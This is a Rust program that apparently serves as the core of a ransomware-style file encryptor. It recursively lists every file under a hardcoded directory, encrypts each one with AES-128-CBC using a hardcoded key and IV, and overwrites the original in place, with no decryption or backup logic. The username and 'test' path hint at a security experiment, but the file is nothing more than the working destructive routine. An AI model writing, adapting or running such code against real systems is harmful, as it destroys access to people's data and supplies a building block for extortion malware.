use std::error::Error;
use openssl::symm::{Cipher, Crypter, Mode};
use std::fs;
use std::fs::File;
use std::io::{Read, Write};

fn lsfiles(dir: &str) -> Vec<String> { 
    let mut files = Vec::new();
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.filter_map(Result::ok) {
            let path = entry.path();
            if path.is_file() {
                files.push(path.to_string_lossy().into_owned());
            } else {
                files.extend(lsfiles(path.to_str().unwrap()));
            }
        }
    }
    files
}

fn main() -> Result<(), Box<dyn Error>> {
    let root_dir = "/home/ninja12-sec/aa-main/test";
    let files = lsfiles(root_dir);
    //
    let key = b"0123456789101112"; 
    let iv = b"initializationvec"; 
    let aes128 = Cipher::aes_128_cbc();
    //
    for path in &files {
        let mut files2encrypt = File::open(path)?;
        let mut data = Vec::new();
        files2encrypt.read_to_end(&mut data)?;
        // 
        let mut e_data = vec![0; data.len() + aes128.block_size()];
        let mut crypter = Crypter::new(aes128, Mode::Encrypt, key, Some(iv))?;
        let e_len = crypter.update(&data, &mut e_data)?;
        let final_len = crypter.finalize(&mut e_data[e_len..])?;
        let total_len = e_len + final_len;
        // 
        let mut files2encrypt = File::create(path)?;
        files2encrypt.write_all(&e_data[..total_len])?;
    }
    Ok(())
}
